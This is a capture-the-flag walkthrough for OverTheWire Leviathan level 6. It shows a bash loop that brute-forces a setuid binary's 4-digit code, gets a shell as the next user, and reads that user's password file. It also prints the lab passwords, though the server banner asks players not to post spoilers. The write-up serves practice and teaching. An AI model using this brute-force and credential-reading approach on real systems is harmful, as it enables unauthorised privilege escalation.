# Leviathan Level 6 → Level 7
There is no information for this level, intentionally.

##  Solution
```
┌──(kali㉿kali)-[~]
└─$ ssh -p 2223 leviathan6@leviathan.labs.overthewire.org
```
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

```
leviathan6@leviathan.labs.overthewire.org's password: UgaoFee4li
```
Linux leviathan 4.18.12 x86_64 GNU/Linux
```              
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
```               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!

  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!
```
leviathan6@leviathan:~$ ls -al                                      #list the contents of the homedirectory of leviathan6
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 7452 Aug 26  2019 leviathan6    #there is a setuid file
-rw-r--r--  1 root       root        675 May 15  2017 .profile 

leviathan6@leviathan:~$ ./leviathan6                                #execute the file                     
usage: ./leviathan6 <4 digit code>                                  #it requires a 4 digit code
                                                                    #write a script for a brute force

leviathan6@leviathan:~$ mkdir /tmp/myl6                             #create a directory myl6 under temp

leviathan6@leviathan:~$ cd /tmp/myl6                                #navigate to myl6 directory

leviathan6@leviathan:/tmp/myl6$ vim brute.sh                        #create a file brute.sh and open it using vim editor
```
### Note1: In the vim editor, press i and type the following script. After typing the script, press Esc to enter into command mode and run :wq to save and exit from the editor.                                                                    
```
#!/bin/bash

for a in {0000..9999}                 #generates 4 digit codes from 0000 to 9999
do
~/leviathan6 $a                       #appends this generated code with the leviathan6 file from the homedirectory in every iteration
done
```

Back to the terminal.
```
leviathan6@leviathan:/tmp/myl6$ chmod +x brute.sh                   #provide execute access for the brute.sh file

leviathan6@leviathan:/tmp/myl6$ ./brute.sh                          #execute the file brute.sh

Wrong                                                               
.
.
.
Wrong
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory                   #after sometime, a command prompt ($) will appear

$ whoami                                                            #to know the user
leviathan7

$ cat /etc/leviathan_pass/leviathan7                                #read the password file of leviathan7
ahy7MaeBo9                                                          #leviathan7 password
^C                                                                  #kill the process

leviathan6@leviathan:/tmp/myl6$ exit                                #logout of leviathan.labs.overthewire.org
logout
Connection to leviathan.labs.overthewire.org closed.
```

#### Command-line help text
```
mkdir-  > make directories
cd     -> change the working directory
cat    -> concatenate files and print on the standard output
whoami -> print effective userid


chmod  -> change file mode bits
+x     -> execute mode
```

#### vim text editor
```
vim            -> Open vim
vim <fileName> -> Open file using vim or create and open the file with vim
i              -> Switch to insert mode & Enter some text
Esc            -> Switch back to command mode
:w             -> Save changes to file
:q             -> Quit Vim
```





